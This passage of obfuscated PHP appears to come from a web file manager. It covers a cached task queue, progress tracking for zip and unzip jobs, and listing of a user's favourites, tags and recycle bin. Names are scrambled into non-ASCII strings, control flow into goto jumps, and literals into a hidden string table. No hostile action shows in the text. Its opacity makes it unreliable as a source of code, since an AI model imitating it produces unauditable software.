fŸöŒÃø×‹; fê–áºó‚: } public static function run() { goto dŠ‡÷‹—´; dŠ‡÷‹—´: $Eâ°¶›• =& $_SERVER[òÀöí]; $FÎ™µŸñÜÜ = self::getAll(); $dÓ—‘ïå = array_shift($FÎ™µŸñÜÜ); goto B®‚¦é©µ; fÎ„ìÂ£ì¥: try { $Eñ‚èƒø¶¡ = Hook::apply($dÓ—‘ïå[$Eâ°¶›•[260]], $dÓ—‘ïå[$Eâ°¶›•[1575]]); } catch (Exception $bÛëÄ•®ìØ) { } write_log($Eâ°¶›•[1579] . $dÓ—‘ïå[$Eâ°¶›•[422]], $Eâ°¶›•[1577]); return !0; goto fÀØõ‰óè; B®‚¦é©µ: if (!$dÓ—‘ïå) { return !1; } self::setAll($FÎ™µŸñÜÜ); write_log($Eâ°¶›•[1578] . $dÓ—‘ïå[$Eâ°¶›•[422]], $Eâ°¶›•[1577]); goto fÎ„ìÂ£ì¥; fÀØõ‰óè: } public static function count() { $fÍãÇèùì = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$fÍãÇèùì) { return 0; } return intval($fÍãÇèùì); } public static function getAll() { $fŒç»Š´¾‹ = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$fŒç»Š´¾‹) { return array(); } return $fŒç»Š´¾‹; } public static function setAll($dÕ­·™®æÂ) { $c“àïãßá = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($dÕ­·™®æÂ), $c“àïãßá); Cache::set(self::QUEUE_DATA, $dÕ­·™®æÂ, $c“àïãßá); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto EÃ•£øôµ; b“‡Ú˜‹ò¯: if (!$fÎä†‡´ì[$EŞ…©¥ø†’[1409]]) { $fÎä†‡´ì[$EŞ…©¥ø†’[1409]] = LNG($EŞ…©¥ø†’[1584]); } goto b‰À¾Ï°äÓ; Eµ«öãõèí: Hook::bind($EŞ…©¥ø†’[1067], array($this, $EŞ…©¥ø†’[1582])); $fÎä†‡´ì =& $this->task; $fÎä†‡´ì[$EŞ…©¥ø†’[1583]] = $EŞ…©¥ø†’[1072]; goto b“‡Ú˜‹ò¯; EÃ•£øôµ: $EŞ…©¥ø†’ =& $_SERVER[òÀöí]; parent::startAfter(); Hook::bind($EŞ…©¥ø†’[1580], array($this, $EŞ…©¥ø†’[1581])); goto Eµ«öãõèí; b‰À¾Ï°äÓ: } protected function endAfter() { $bš±µ“£ˆ… =& $_SERVER[òÀöí]; parent::endAfter(); Hook::unbind($bš±µ“£ˆ…[1580], array($this, $bš±µ“£ˆ…[1581])); Hook::unbind($bš±µ“£ˆ…[1067], array($this, $bš±µ“£ˆ…[1582])); } public function updateAfter() { $E¾ÅÕš‰¥í =& $_SERVER[òÀöí]; $fµšœáœ¬· =& $this->task; if (!$fµšœáœ¬·[$E¾ÅÕš‰¥í[1000]] || !$fµšœáœ¬·[$E¾ÅÕš‰¥í[717]]) { return; } if ($fµšœáœ¬·[$E¾ÅÕš‰¥í[1583]] == $E¾ÅÕš‰¥í[1072]) { $dŞßø•Õ™ = 0; if ($fµšœáœ¬·[$E¾ÅÕš‰¥í[1549]]) { $dŞßø•Õ™ = $fµšœáœ¬·[$E¾ÅÕš‰¥í[1550]] / $fµšœáœ¬·[$E¾ÅÕš‰¥í[1549]]; } $fµšœáœ¬·[$E¾ÅÕš‰¥í[1505]] = $dŞßø•Õ™ * 0.3; } else { if ($fµšœáœ¬·[$E¾ÅÕš‰¥í[1583]] == $E¾ÅÕš‰¥í[309]) { $dŞßø•Õ™ = $fµšœáœ¬·[$E¾ÅÕš‰¥í[1014]] / $fµšœáœ¬·[$E¾ÅÕš‰¥í[1000]]; $fµšœáœ¬·[$E¾ÅÕš‰¥í[1505]] = 0.3 + $dŞßø•Õ™ * 0.4; } else { if ($fµšœáœ¬·[$E¾ÅÕš‰¥í[1583]] == $E¾ÅÕš‰¥í[106]) { $E†§±·¸¹ = 0; if ($fµšœáœ¬·[$E¾ÅÕš‰¥í[1551]] == $E¾ÅÕš‰¥í[106]) { $E†§±·¸¹ = $fµšœáœ¬·[$E¾ÅÕš‰¥í[1550]]; } $dŞßø•Õ™ = ($fµšœáœ¬·[$E¾ÅÕš‰¥í[1554]] + $E†§±·¸¹) / $fµšœáœ¬·[$E¾ÅÕš‰¥í[717]]; $fµšœáœ¬·[$E¾ÅÕš‰¥í[1505]] = 0.3 + 0.4 + $dŞßø•Õ™ * 0.3; } } } if ($fµšœáœ¬·[$E¾ÅÕš‰¥í[1505]] > 0) { $e’‰³ºÜˆÛ = timeFloat() - $fµšœáœ¬·[$E¾ÅÕš‰¥í[1507]] - $fµšœáœ¬·[$E¾ÅÕš‰¥í[1510]]; $fµšœáœ¬·[$E¾ÅÕš‰¥í[1511]] = $e’‰³ºÜˆÛ * (1 - $fµšœáœ¬·[$E¾ÅÕš‰¥í[1505]]) / $fµšœáœ¬·[$E¾ÅÕš‰¥í[1505]]; } } public function addFile($D­­Üà¯»Ü) { goto aáäù±™Œã; b†İç£™õ«: $fï­¸š…àÇ[$e‘æ–‰°„[1002]] = $e‘æ–‰°„[1566]; $fï­¸š…àÇ[$e‘æ–‰°„[1551]] = $e‘æ–‰°„[1072]; $fï­¸š…àÇ[$e‘æ–‰°„[717]] = $aÔ‘†ğàÕì[$e‘æ–‰°„[77]]; goto EÉ‘ò±ë½; BˆÒŒ·½è: $this->update(); goto dì³İ°…îå; aáäù±™Œã: $e‘æ–‰°„ =& $_SERVER[òÀöí]; $fï­¸š…àÇ =& $this->task; $aÔ‘†ğàÕì = IO::info($D­­Üà¯»Ü); goto eï¹÷²²é; EÉ‘ò±ë½: $fï­¸š…àÇ[$e‘æ–‰°„[1000]] = 1; $aãŠ¸”“¡† = 0; $fï­¸š…àÇ[$e‘æ–‰°„[1558]] = array($e‘æ–‰°„[1559] => $aãŠ¸”“¡† + 1, $e‘æ–‰°„[404] => $aÔ‘†ğàÕì[$e‘æ–‰°„[28]], $e‘æ–‰°„[75] => $aÔ‘†ğàÕì[$e‘æ–‰°„[75]], $e‘æ–‰°„[484] => $aÔ‘†ğàÕì[$e‘æ–‰°„[484]] ? $aÔ‘†ğàÕì[$e‘æ–‰°„[484]] : $aÔ‘†ğàÕì[$e‘æ–‰°„[75]]); goto BˆÒŒ·½è; eï¹÷²²é: $fï­¸š…àÇ[$e‘æ–‰°„[1547]] = $aÔ‘†ğàÕì[$e‘æ–‰°„[28]]; $fï­¸š…àÇ[$e‘æ–‰°„[1549]] = $aÔ‘†ğàÕì[$e‘æ–‰°„[77]]; $fï­¸š…àÇ[$e‘æ–‰°„[1550]] = 0; goto b†İç£™õ«; dì³İ°…îå: } public function unzipAfter($e¹¶ƒ“†) { goto D›ä‡Œ¬; B–²ÔÕíÉ®: $A–¦¦˜—ªÒ[$E°˜‡®÷â[1014]] = 0; $A–¦¦˜—ªÒ[$E°˜‡®÷â[1549]] = 0; $A–¦¦˜—ªÒ[$E°˜‡®÷â[1550]] = 0; goto F·©ºŞÑ·; Eë±¨Å¨ä: if ($fêù·ç·˜[$E°˜‡®÷â[29]] == $E°˜‡®÷â[173]) { $A–¦¦˜—ªÒ[$E°˜‡®÷â[1000]] = 1; } else { $A–¦¦˜—ªÒ[$E°˜‡®÷â[1000]] = $fêù·ç·˜[$E°˜‡®÷â[80]][$E°˜‡®÷â[78]]; } $A–¦¦˜—ªÒ[$E°˜‡®÷â[1002]] = $E°˜‡®÷â[33]; $A–¦¦˜—ªÒ[$E°˜‡®÷â[1551]] = 0; goto B–²ÔÕíÉ®; F·©ºŞÑ·: $A–¦¦˜—ªÒ[$E°˜‡®÷â[1547]] = $E°˜‡®÷â[33]; $A–¦¦˜—ªÒ[$E°˜‡®÷â[1554]] = 0; $A–¦¦˜—ªÒ[$E°˜‡®÷â[717]] = $fêù·ç·˜[$E°˜‡®÷â[77]]; goto A¶éÁë›‚á; A¶éÁë›‚á: $this->update(); self::log($E°˜‡®÷â[1585] . json_encode(array($A–¦¦˜—ªÒ, $fêù·ç·˜))); goto B¶­Æ‘•Í; D›ä‡Œ¬: $E°˜‡®÷â =& $_SERVER[òÀöí]; $A–¦¦˜—ªÒ =& $this->task; $A–¦¦˜—ªÒ[$E°˜‡®÷â[1583]] = $E°˜‡®÷â[106]; goto aãœÏëí; aãœÏëí: $fêù·ç·˜ = IO::infoWithChildren($e¹¶ƒ“†); $c§¿À›Õ˜í = 0; $A–¦¦˜—ªÒ[$E°˜‡®÷â[1558]] = array($E°˜‡®÷â[1559] => $c§¿À›Õ˜í + 1, $E°˜‡®÷â[404] => $fêù·ç·˜[$E°˜‡®÷â[28]], $E°˜‡®÷â[75] => $fêù·ç·˜[$E°˜‡®÷â[75]], $E°˜‡®÷â[484] => $fêù·ç·˜[$E°˜‡®÷â[484]] ? $fêù·ç·˜[$E°˜‡®÷â[484]] : $fêù·ç·˜[$E°˜‡®÷â[75]]); goto Eë±¨Å¨ä; B¶­Æ‘•Í: } public function nameParse($F¹ğ£¤¨Ç¬) { goto a³ÎšŒõ â; a‡ÄÀÈÜ«Ë: $DİÛîôì– = get_path_this($F¹ğ£¤¨Ç¬); if (strstr($DİÛîôì–, $BÚÅÆ•—¡[94])) { $bÉôÆ Š­‚[$BÚÅÆ•—¡[1014]] += 1; $bÉôÆ Š­‚[$BÚÅÆ•—¡[1000]] += 1; } $bÉôÆ Š­‚[$BÚÅÆ•—¡[1547]] = $F¹ğ£¤¨Ç¬; goto Côñàòé«; a³ÎšŒõ â: $BÚÅÆ•—¡ =& $_SERVER[òÀöí]; $bÉôÆ Š­‚ =& $this->task; if ($bÉôÆ Š­‚[$BÚÅÆ•—¡[1583]] == $BÚÅÆ•—¡[1072]) { $bÉôÆ Š­‚[$BÚÅÆ•—¡[1583]] = $BÚÅÆ•—¡[309]; $bÉôÆ Š­‚[$BÚÅÆ•—¡[1554]] = 0; $bÉôÆ Š­‚[$BÚÅÆ•—¡[717]] = 0; } goto a‡ÄÀÈÜ«Ë; Côñàòé«: $this->update(); goto c‡…¯¢ùˆÕ; c‡…¯¢ùˆÕ: } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $fƒ‡Œ‹“‘´ =& $_SERVER[òÀöí]; parent::startAfter(); Hook::bind($fƒ‡Œ‹“‘´[1586], array($this, $fƒ‡Œ‹“‘´[1581])); $bÈÇøèÕÛ™ =& $this->task; $bÈÇøèÕÛ™[$fƒ‡Œ‹“‘´[1583]] = $fƒ‡Œ‹“‘´[1072]; if (!$bÈÇøèÕÛ™[$fƒ‡Œ‹“‘´[1409]]) { $bÈÇøèÕÛ™[$fƒ‡Œ‹“‘´[1409]] = LNG($fƒ‡Œ‹“‘´[1587]); } } protected function endAfter() { $cƒØ¡ùÄ =& $_SERVER[òÀöí]; parent::endAfter(); Hook::unbind($cƒØ¡ùÄ[1586], array($this, $cƒØ¡ùÄ[1581])); } public function updateAfter() { $A¥Õßô†å =& $_SERVER[òÀöí]; $f½ĞïÏ‚Ñã =& $this->task; if (!$f½ĞïÏ‚Ñã[$A¥Õßô†å[1000]] || !$f½ĞïÏ‚Ñã[$A¥Õßô†å[717]]) { return; } if ($f½ĞïÏ‚Ñã[$A¥Õßô†å[1583]] == $A¥Õßô†å[1072]) { $E­»†‚÷í” = $f½ĞïÏ‚Ñã[$A¥Õßô†å[1550]]; if ($f½ĞïÏ‚Ñã[$A¥Õßô†å[1551]] != $A¥Õßô†å[1072]) { $E­»†‚÷í” = 0; } $B”Ñ‹¶òÒ¶ = ($f½ĞïÏ‚Ñã[$A¥Õßô†å[1554]] + $E­»†‚÷í”) / $f½ĞïÏ‚Ñã[$A¥Õßô†å[717]]; $f½ĞïÏ‚Ñã[$A¥Õßô†å[1505]] = $B”Ñ‹¶òÒ¶ * 0.3; } else { if ($f½ĞïÏ‚Ñã[$A¥Õßô†å[1583]] == $A¥Õßô†å[309]) { $B”Ñ‹¶òÒ¶ = $f½ĞïÏ‚Ñã[$A¥Õßô†å[1014]] / $f½ĞïÏ‚Ñã[$A¥Õßô†å[1000]]; $f½ĞïÏ‚Ñã[$A¥Õßô†å[1505]] = 0.3 + $B”Ñ‹¶òÒ¶ * 0.5; } else { if ($f½ĞïÏ‚Ñã[$A¥Õßô†å[1583]] == $A¥Õßô†å[106]) { $B”Ñ‹¶òÒ¶ = 0; if ($f½ĞïÏ‚Ñã[$A¥Õßô†å[1549]]) { $B”Ñ‹¶òÒ¶ = $f½ĞïÏ‚Ñã[$A¥Õßô†å[1550]] / $f½ĞïÏ‚Ñã[$A¥Õßô†å[1549]]; } $f½ĞïÏ‚Ñã[$A¥Õßô†å[1505]] = 0.3 + 0.5 + $B”Ñ‹¶òÒ¶ * 0.2; } } } if ($f½ĞïÏ‚Ñã[$A¥Õßô†å[1505]] > 0) { $cß‹àà‚µ = timeFloat() - $f½ĞïÏ‚Ñã[$A¥Õßô†å[1507]] - $f½ĞïÏ‚Ñã[$A¥Õßô†å[1510]]; $f½ĞïÏ‚Ñã[$A¥Õßô†å[1511]] = $cß‹àà‚µ * (1 - $f½ĞïÏ‚Ñã[$A¥Õßô†å[1505]]) / $f½ĞïÏ‚Ñã[$A¥Õßô†å[1505]]; } } public function copyFileStart($aÁåíç, $E×ÇÎè¥ƒ¤, $EŸ™ñ‘®œÅ, $A‹Ø£Ğ¥ÎÅ, $bŒóøİìÈ, $dôªùÁê‰) { $f×÷İÅ”éµ =& $_SERVER[òÀöí]; parent::copyFileStart($aÁåíç, $E×ÇÎè¥ƒ¤, $EŸ™ñ‘®œÅ, $A‹Ø£Ğ¥ÎÅ, $bŒóøİìÈ, $dôªùÁê‰); $DÔ¾—…‰ÒÖ =& $this->task; if ($DÔ¾—…‰ÒÖ[$f×÷İÅ”éµ[1583]] == $f×÷İÅ”éµ[309]) { $DÔ¾—…‰ÒÖ[$f×÷İÅ”éµ[1583]] = $f×÷İÅ”éµ[106]; } $this->update(); } public function copyFileEnd($f®¶Ó‹Ù¯Š, $c´ˆö•¤Àš, $DÜÃÓµ…ˆª, $f—Û¿˜âÒ, $Bñ‰¸‚èÖ¤, $Eäî‰´œ†) { $d’¸ï»õâ‘ =& $_SERVER[òÀöí]; $dÓšñÓ‘Òä =& $this->task; $dÓšñÓ‘Òä[$d’¸ï»õâ‘[1550]] = $dÓšñÓ‘Òä[$d’¸ï»õâ‘[1549]]; $dÓšñÓ‘Òä[$d’¸ï»õâ‘[1554]] += $dÓšñÓ‘Òä[$d’¸ï»õâ‘[1549]]; $dÓšñÓ‘Òä[$d’¸ï»õâ‘[1551]] = $d’¸ï»õâ‘[33]; $this->update(); } public function nameParse($Fô¥Ò´’‡) { $cÃÜËÄ´—¡ =& $_SERVER[òÀöí]; $eÌ‹©–„õ =& $this->task; if ($eÌ‹©–„õ[$cÃÜËÄ´—¡[1014]] < $eÌ‹©–„õ[$cÃÜËÄ´—¡[1000]]) { $E³±ô·¨Ÿš = get_path_this($Fô¥Ò´’‡); if (strstr($E³±ô·¨Ÿš, $cÃÜËÄ´—¡[94])) { $eÌ‹©–„õ[$cÃÜËÄ´—¡[1014]] += 1; } } if ($eÌ‹©–„õ[$cÃÜËÄ´—¡[1583]] == $cÃÜËÄ´—¡[1072]) { $eÌ‹©–„õ[$cÃÜËÄ´—¡[1583]] = $cÃÜËÄ´—¡[309]; } $eÌ‹©–„õ[$cÃÜËÄ´—¡[1547]] = $Fô¥Ò´’‡; $this->update(); } } goto b¯ğƒÒó¢«; D­–ñŠ«Ï: function binCheckBigger($aÊ„Ã·§Ä›, $d¢ëÄ³Î‘) { return $aÊ„Ã·§Ä› > $d¢ëÄ³Î‘; } $_SERVER[$_SERVER[ÉØ›ù‘ºø][3]] = ("\70\67\70\61"."\70\67")+0;$_zqTg="skXpPR7SS44WjuFED52cZdG65hrZZmUgpXh8nuuejsG3qqbiYUwfNTatYyeemFgF2IRaakx8nMBYx7ENHZ";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($A÷Ø½â„’´, $Cîù¸¡ŒÇĞ) { $a‘îÍÉî˜Ù =& $_SERVER[òÀöí]; if (isset(self::$_methodList[$A÷Ø½â„’´])) { return @call_user_func_array(self::$_methodList[$A÷Ø½â„’´], $Cîù¸¡ŒÇĞ); } else { if (method_exists($this, $A÷Ø½â„’´)) { return call_user_func_array(array($this, $A÷Ø½â„’´), $Cîù¸¡ŒÇĞ); } else { think_exception(__CLASS__ . $a‘îÍÉî˜Ù[4] . $A÷Ø½â„’´ . $a‘îÍÉî˜Ù[5]); } } } public static function __callStatic($D®¨ÜöÀßí, $bñÎÅÙĞÖ‡) { if (isset(self::$_methodListStatic[$D®¨ÜöÀßí])) { return call_user_func_array(self::$_methodListStatic[$D®¨ÜöÀßí], $bñÎÅÙĞÖ‡); } else { if (method_exists(self, $D®¨ÜöÀßí)) { return call_user_func_array(array(self, $D®¨ÜöÀßí), $bñÎÅÙĞÖ‡); } else { show_json("{$D®¨ÜöÀßí}\x28\51\40\x6e\x6f\164\40\x65\170\x69\x73\x74\73", !1); } } } public static function addMethod($D¶²Ú®…º, $aìé­ÂÏ ù) { self::$_methodList[$D¶²Ú®…º] = $aìé­ÂÏ ù; } public static function addMethodStatic($añÌ¹¨‰ƒ, $D¯”•ŠÜâ§) { self::$_methodListStatic[$añÌ¹¨‰ƒ] = $D¯”•ŠÜâ§; } } goto aâØÑ¨¯í; f×ğÀÖµŒ: class SourceListModel extends ModelBase { protected $tableName = "\151\157\137\163\x6f\165\x72\x63\x65"; protected $tableMeta = array("\x74\x61\x62\x6c\x65\116\x61\155\145" => "\151\x6f\137\x73\x6f\x75\162\x63\145\137\155\x65\x74\141", "\155\x65\x74\141\106\151\145\x6c\144" => "\x73\x6f\x75\162\143\x65\111\x44"); protected $dataAuto = array(array("\155\x6f\x64\151\146\171\124\151\155\145", "\x74\151\155\145", "\x69\x6e\x73\x65\x72\164", "\146\165\156\x63\164\151\157\x6e"), array("\143\x72\x65\x61\164\145\x54\x69\155\145", "\164\151\x6d\145", "\x69\156\x73\x65\x72\164", "\146\165\156\143\x74\151\x6f\x6e"), array("\166\x69\145\167\124\x69\x6d\x65", "\164\151\x6d\145", "\x69\156\163\x65\x72\164", "\x66\x75\156\143\164\151\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($aõØçˆµ¶Å) { return $this->listSource(array($_SERVER[òÀöí][386] => $aõØçˆµ¶Å)); } public function typeName($cß§³Ê Ğ¾) { static $E½ÖÂº‰ä‚ = array(self::TYPE_SYSTEM => "\163\171\163\164\x65\x6d", self::TYPE_USER => "\165\x73\x65\162", self::TYPE_GROUP => "\x67\162\x6f\165\x70"); return $E½ÖÂº‰ä‚[$cß§³Ê Ğ¾ . $_SERVER[òÀöí][33]]; } public function sourceListInfo($EùÂ²ÊîÖ…, $f¼÷“¤„ƒ• = false) { goto c‹è¶½£¸™; c½ëÏ­Öî¼: return array_to_keyvalue($cõÂ¾ïÏ¨Õ, $a÷æ•¹‘Î[387]); goto aõº’§Û··; d÷†İÉÎ¥: if (!$EùÂ²ÊîÖ…) { return array(); } $cõÂ¾ïÏ¨Õ = $this->where(array($a÷æ•¹‘Î[387] => array($a÷æ•¹‘Î[7], $EùÂ²ÊîÖ…)))->select(); $this->_listDataApply($cõÂ¾ïÏ¨Õ, $f¼÷“¤„ƒ•); goto c½ëÏ­Öî¼; c‹è¶½£¸™: $a÷æ•¹‘Î =& $_SERVER[òÀöí]; $EùÂ²ÊîÖ… = $EùÂ²ÊîÖ… ? $EùÂ²ÊîÖ… : array(); $EùÂ²ÊîÖ… = array_filter(array_unique($EùÂ²ÊîÖ…)); goto d÷†İÉÎ¥; aõº’§Û··: } public function pathInfoFilter($bŒ‰ÎØ) { goto Eê¡ÊãÒ¹; a¿âø‹Æ˜æ: $fêª¿Æ•¿– .= $c‰Ş½“íˆ”[392]; $fêª¿Æ•¿– .= $c‰Ş½“íˆ”[393]; $D¸Ó´–„²ò = explode($c‰Ş½“íˆ”[47], $fêª¿Æ•¿–); goto eó·‘é”ò¸; eó·‘é”ò¸: if (isset($bŒ‰ÎØ[$c‰Ş½“íˆ”[394]]) && $bŒ‰ÎØ[$c‰Ş½“íˆ”[394]][$c‰Ş½“íˆ”[395]] == -1) { $D¸Ó´–„²ò = array_remove_value($D¸Ó´–„²ò, $c‰Ş½“íˆ”[192]); $D¸Ó´–„²ò = array_remove_value($D¸Ó´–„²ò, $c‰Ş½“íˆ”[83]); $D¸Ó´–„²ò = array_remove_value($D¸Ó´–„²ò, $c‰Ş½“íˆ”[396]); $D¸Ó´–„²ò = array_remove_value($D¸Ó´–„²ò, $c‰Ş½“íˆ”[397]); $D¸Ó´–„²ò = array_remove_value($D¸Ó´–„²ò, $c‰Ş½“íˆ”[77]); $D¸Ó´–„²ò = array_remove_value($D¸Ó´–„²ò, $c‰Ş½“íˆ”[398]); } $bŒ‰ÎØ = array_field_key($bŒ‰ÎØ, $D¸Ó´–„²ò); return $bŒ‰ÎØ; goto CŠÛˆôŠÁÉ; AÌ¬×½Ä˜: $bŒ‰ÎØ[$c‰Ş½“íˆ”[389]] = $this->typeName($bŒ‰ÎØ[$c‰Ş½“íˆ”[389]]); if ($bŒ‰ÎØ[$c‰Ş½“íˆ”[388]] != 1) { $bŒ‰ÎØ[$c‰Ş½“íˆ”[167]] = $bŒ‰ÎØ[$c‰Ş½“íˆ”[390]]; unset($bŒ‰ÎØ[$c‰Ş½“íˆ”[390]]); } $fêª¿Æ•¿– = $c‰Ş½“íˆ”[391]; goto a¿âø‹Æ˜æ; Eê¡ÊãÒ¹: $c‰Ş½“íˆ” =& $_SERVER[òÀöí]; $bŒ‰ÎØ[$c‰Ş½“íˆ”[75]] = KodIO::make($bŒ‰ÎØ[$c‰Ş½“íˆ”[387]]); $bŒ‰ÎØ[$c‰Ş½“íˆ”[29]] = $bŒ‰ÎØ[$c‰Ş½“íˆ”[388]] == 1 ? $c‰Ş½“íˆ”[76] : $c‰Ş½“íˆ”[173]; goto AÌ¬×½Ä˜; CŠÛˆôŠÁÉ: } public function listUserFav() { goto a•©Í—¬Ìñ; e˜ÚÚ°ˆÎš: $D­é¢ŠŠ²ì = array_to_keyvalue($D­é¢ŠŠ²ì, $a®ˆ©É³•[33], $a®ˆ©É³•[75]); if ($D­é¢ŠŠ²ì) { $e¼§´Úñ¥ = $this->listSource(array($a®ˆ©É³•[401] => array($a®ˆ©É³•[402], $D­é¢ŠŠ²ì))); } $e¼§´Úñ¥ = array_to_keyvalue($e¼§´Úñ¥[$a®ˆ©É³•[363]], $a®ˆ©É³•[387]); goto Cá©·Îó; a•©Í—¬Ìñ: $a®ˆ©É³• =& $_SERVER[òÀöí]; $f©³Ÿ±¸Ÿ˜ = Model($a®ˆ©É³•[399])->listData(); $D­é¢ŠŠ²ì = array_filter_by_field($f©³Ÿ±¸Ÿ˜, $a®ˆ©É³•[29], $a®ˆ©É³•[400]); goto e˜ÚÚ°ˆÎš; Cá©·Îó: foreach ($f©³Ÿ±¸Ÿ˜ as &$FÇÌÔº‰×‚) { $FÇÌÔº‰×‚ = array($a®ˆ©É³•[403] => $FÇÌÔº‰×‚[$a®ˆ©É³•[385]], $a®ˆ©É³•[404] => $FÇÌÔº‰×‚[$a®ˆ©É³•[28]], $a®ˆ©É³•[405] => $FÇÌÔº‰×‚[$a®ˆ©É³•[75]], $a®ˆ©É³•[406] => $FÇÌÔº‰×‚[$a®ˆ©É³•[29]], $a®ˆ©É³•[407] => $FÇÌÔº‰×‚[$a®ˆ©É³•[192]], $a®ˆ©É³•[408] => $FÇÌÔº‰×‚[$a®ˆ©É³•[83]]); if ($FÇÌÔº‰×‚[$a®ˆ©É³•[29]] == $a®ˆ©É³•[400] && $e¼§´Úñ¥[$FÇÌÔº‰×‚[$a®ˆ©É³•[75]]]) { $FÇÌÔº‰×‚[$a®ˆ©É³•[84]] = $e¼§´Úñ¥[$FÇÌÔº‰×‚[$a®ˆ©É³•[75]]]; } } unset($FÇÌÔº‰×‚); return $f©³Ÿ±¸Ÿ˜; goto AÄ˜‚‹ÆË; AÄ˜‚‹ÆË: } public function listUserTag($A·óÀ†Â‰›) { goto C†‰³îîæ¾; B§ï•á­Ï: $bàˆ‰›³ª = array_to_keyvalue($b‚ÀÙ‘œõ£[$c»Ì İ¶Á’[73]], $c»Ì İ¶Á’[33], $c»Ì İ¶Á’[387]); $B´Üòò±¾Š = array_merge($bàˆ‰›³ª, $bÛÚ¥‹÷Ç™); foreach ($BÕÂµ²î§é as $f¢’ÓãƒÏ) { if (!in_array($f¢’ÓãƒÏ, $B´Üòò±¾Š)) { $eÍòÑ‹í‡ó[] = $f¢’ÓãƒÏ; } } goto AğÌŞ³Æ¬ğ; dÚÈ‘Ä‚Ì©: if (!$b‚ÀÙ‘œõ£ || count($BÕÂµ²î§é) == $b‚ÀÙ‘œõ£[$c»Ì İ¶Á’[360]][$c»Ì İ¶Á’[361]]) { return $b‚ÀÙ‘œõ£; } $eÍòÑ‹í‡ó = array(); $bÛÚ¥‹÷Ç™ = array_to_keyvalue($b‚ÀÙ‘œõ£[$c»Ì İ¶Á’[74]], $c»Ì İ¶Á’[33], $c»Ì İ¶Á’[387]); goto B§ï•á­Ï; F¸åâÑŞÓ: foreach ($b©Ò­´Îè™ as $A»ÃÈ´•“Ø => $Aè‹‚»¦) { $Dğ…³ê³¸² = !0; if (!$A·óÀ†Â‰›) { $BÕÂµ²î§é[] = $A»ÃÈ´•“Ø; continue; } foreach ($A·óÀ†Â‰› as $EÓ‰Ì‘­ñˆ) { if (!in_array($EÓ‰Ì‘­ñˆ, $Aè‹‚»¦)) { $Dğ…³ê³¸² = !1; break; } } if ($Dğ…³ê³¸²) { $BÕÂµ²î§é[] = $A»ÃÈ´•“Ø; } } if (!$BÕÂµ²î§é) { return array(); } $b‚ÀÙ‘œõ£ = $this->listSource(array($c»Ì İ¶Á’[401] => array($c»Ì İ¶Á’[402], $BÕÂµ²î§é))); goto dÚÈ‘Ä‚Ì©; C†‰³îîæ¾: $c»Ì İ¶Á’ =& $_SERVER[òÀöí]; if ($A·óÀ†Â‰› && !is_array($A·óÀ†Â‰›)) { $A·óÀ†Â‰› = array($A·óÀ†Â‰›); } $B•ğÄçê‹ = Model($c»Ì İ¶Á’[409])->listData(); goto CÅºÃ•Ò¬ù; AğÌŞ³Æ¬ğ: if ($eÍòÑ‹í‡ó) { Model($c»Ì İ¶Á’[411])->removeBySource($eÍòÑ‹í‡ó); } return $b‚ÀÙ‘œõ£; goto E˜ƒƒÆ¯†; CÅºÃ•Ò¬ù: $b©Ò­´Îè™ = array(); foreach ($B•ğÄçê‹ as $d˜õ¾°ˆ×À) { $f¢’ÓãƒÏ = $d˜õ¾°ˆ×À[$c»Ì İ¶Á’[75]]; if (!$f¢’ÓãƒÏ) { continue; } if (!isset($b©Ò­´Îè™[$f¢’ÓãƒÏ])) { $b©Ò­´Îè™[$f¢’ÓãƒÏ] = array(); } $b©Ò­´Îè™[$f¢’ÓãƒÏ][] = $d˜õ¾°ˆ×À[$c»Ì İ¶Á’[410]]; } $BÕÂµ²î§é = array(); goto F¸åâÑŞÓ; E˜ƒƒÆ¯†: } public function listUserRecycle() { $c°Šˆ»ÆõÉ =& $_SERVER[òÀöí]; $Eœóğ‘·¾Â = Model($c°Šˆ»ÆõÉ[412])->listData(); if (!$Eœóğ‘·¾Â) { return array(); } $B‘‰…ˆÛ² = array($c°Šˆ»ÆõÉ[401] => array($c°Šˆ»ÆõÉ[402], $Eœóğ‘·¾Â), $c°Šˆ»ÆõÉ[413] => 1); return $this->listSource($B‘‰…ˆÛ²); } public function listSource($FÑ¹öÍÁ«©, $c¾‚à—ù©¾ = 3000) { goto A¹×¶–«Û; A¹×¶–«Û: $A ©»Šô×ˆ =& $_SERVER[òÀöí]; if (!isset($FÑ¹öÍÁ«©[$A ©»Šô×ˆ[414]])) { $FÑ¹öÍÁ«©[$A ©»Šô×ˆ[414]] = 0; } $b ‹™¢Û’Ñ = $A ©»Šô×ˆ[415]; goto bèÈ ï®·; bèÈ ï®·: $a¥ç‹— …¨ = $this->field($b ‹™¢Û’Ñ)->_makeOrder()->where($FÑ¹öÍÁ«©)->selectPage($c¾‚à—ù©¾); $this->_listDataApply($a¥ç‹— …¨[$A ©»Šô×ˆ[363]]); $this->_listMake($a¥ç‹— …¨); goto DÙå…ïŞ•µ; DÙå…ïŞ•µ: return $a¥ç‹— …¨; goto AÚ‡¤·Í½ª; AÚ‡¤·Í½ª: } protected function _makeOrder() { goto B‚¸à—ñ¹Ú; f‚Ê±ç™‡‡: if ($EŒÂÛÃøÇ == $Bˆ…ˆÌŞ›¡[28]) { } $b²¤âØÊ®… = $Bˆ…ˆÌŞ›¡[426] . $DÀã´›èÜÈ[$EŒÂÛÃøÇ] . $Bˆ…ˆÌŞ›¡[50] . $BÓ»©àŒîÖ[$cŞ¡éÊÑòß]; return $this->order(rtrim(trim($b²¤âØÊ®…), $Bˆ…ˆÌŞ›¡[47])); goto A¨ô¿çˆñ·; C¾×ã¨»ùÇ: $BÓ»©àŒîÖ = array($Bˆ…ˆÌŞ›¡[419] => $Bˆ…ˆÌŞ›¡[420], $Bˆ…ˆÌŞ›¡[421] => $Bˆ…ˆÌŞ›¡[422]); $DÀã´›èÜÈ = array($Bˆ…ˆÌŞ›¡[28] => $Bˆ…ˆÌŞ›¡[28], 